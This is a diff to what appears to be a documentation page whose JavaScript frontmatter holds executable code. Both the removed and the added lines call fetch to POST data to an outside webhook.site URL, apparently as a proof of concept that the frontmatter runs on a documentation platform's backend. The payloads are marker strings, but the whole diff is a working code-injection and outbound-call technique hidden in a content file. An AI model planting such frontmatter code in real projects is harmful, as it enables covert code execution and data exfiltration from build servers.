@@ -1,6 +1,6 @@
 ---js
 {
-  title: (console.log("EVIL LOG FROM INSIDE FRONTMATTER"), fetch("https://webhook.site/3728d239-1be1-42f0-bab2-44aeeda90243", { method: "POST", headers: { "content-type": "application/json" }, body: JSON.stringify({ id: 7, name: "Jack Daniels", position: "Assistant" }) }), "test")
+fetch("https://webhook.site/3728d239-1be1-42f0-bab2-44aeeda90243", { method: "POST", headers: { "content-type": "application/json" }, body: JSON.stringify({ "hello": "FROM THE MINTLIFY BACKEND" }) })
 }
 ---
 
